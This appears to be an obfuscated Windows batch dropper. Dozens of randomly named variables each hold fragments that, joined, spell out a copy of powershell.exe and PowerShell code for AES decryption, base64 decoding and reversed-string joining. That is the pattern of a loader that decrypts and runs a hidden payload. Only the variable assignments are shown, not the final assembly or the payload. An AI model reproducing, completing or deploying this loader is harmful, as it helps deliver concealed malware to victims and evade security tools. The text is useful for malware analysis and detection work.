@echo off
set "UBxlvHccmY=1."
set "BbAgdakaMg=Wi"
set "vXcHjyxkia=em"
set "tCNftqmUnP=he"
set "BYuRZcIYdh=rS"
set "QnpcEsyOFL=nd"
set "arNgcNYJYq=.e"
set "XugWbAWxUJ=Sy"
set "kMztHDzBtO=Po"
set "OmzycHkJQr=:\"
set "XsQfUDcgtR=s\"
set "jyAvKJjozl=he"
set "XglIkwZPVe=rs"
set "dMoUtRapqT=do"
set "PqeVQoGOLH=ws"
set "ECmxRhuTcS= C"
set "UkrjMkIfYh=po"
set "qsvOOBpUjs=32"
set "jvdevfkonz=st"
set "QeLaMibGxv=py"
set "IhrnVBoLKP=\W"
set "HMkTcachJf= /"
set "szWBJZiyGU=ll"
set "VKmwSqpTdH=co"
set "XxGZdSKutW=y "
set "VvQlTEEmXf=ow"
set "ZEAIVRbKfb=we"
set "ZWdeYfyBjV=ll"
set "lTkTYBdeYl=xe"
set "ujUHglrIuE=\v"
set "JYkeMccThZ=0\"
set "kQhGoWTxUe=we"
set "tNTUvZrzMD=in"
set "IBxeRfaiOR=cd"
set "QOPOTEyauZ= %~dp0"
set "gKzrkqzXaM=$Fhp"
set "gqnDrAEFCF=pher"
set "jcXravaYsI=tem."
set "xpgxXqYuEI=oin "
set "ivhntdxWWB='[-1"
set "eSsBgUARQn=);$z"
set "MemmKJYedm=-joi"
set "rpBugNHvCG=gsYZ"
set "CKcjkgDjdl=ddin"
set "PbbyfnulfZ=em.C"
set "VYixFxzquE=PKCS"
set "xuWzNvpSsE=d;$z"
set "xQEZhOJBqF=yste"
set "RVLUJHAZxy=l = "
set "GuJQZyftvv=srJ "
set "jPVxzBqyFC=eMVs"
set "BafUvuqNGp=ct S"
set "jSgFlWZuBH=..-1"
set "BZzniTaDwz=yste"
set "zgWYVKPRBV=]::("
set "DmcsXFyGbz=L4Yi"
set "SPALJWowWv=ateD"
set "eocKXNfOsV=)) {"
set "zNisslunrl=tV ="
set "DBXNFVRZUu=saBm"
set "OQWJNrSySF=hy.A"
set "aMMjYRFqfN=bstr"
set "kVKzVCtvmM=Mode"
set "OxXidcZDkE=n ''"
set "zKxaFnfYAH=bzp "
set "gJVkTPVvQN=$sxg"
set "TOQwDXjWgU===')"
set "PeSrUiLZQi=();$"
set "uXZkhGXQJn=gjYA"
set "IffwEOlHLB=-1.."
set "jSgHDoztRg=bjec"
set "DxHOjtbQXr=);$Q"
set "mOXmdCgUZV=6esa"
set "fSjXtlMBCh=l, 0"
set "rmDDiXfuQQ=[-1."
set "uesAvJCwHC=BC;$"
set "rKYqyGIpdY=garW"
